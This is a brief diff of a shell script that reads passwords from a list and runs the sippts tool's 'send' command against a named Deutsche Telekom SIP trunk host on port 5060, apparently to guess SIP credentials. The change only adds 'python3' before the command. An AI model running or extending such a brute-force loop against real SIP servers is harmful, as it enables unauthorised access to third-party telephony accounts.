@@ -11,7 +11,7 @@ while IFS= read -r password; do
     echo "Trying password: $password"
     
     # Execute the sippts command with the current password
-    ./build/scripts-3.12/sippts send \
+    python3 ./build/scripts-3.12/sippts send \
     -i siptrunk2.ver.sul.t-online.de \
     -r 5060 \
     -p tcp \
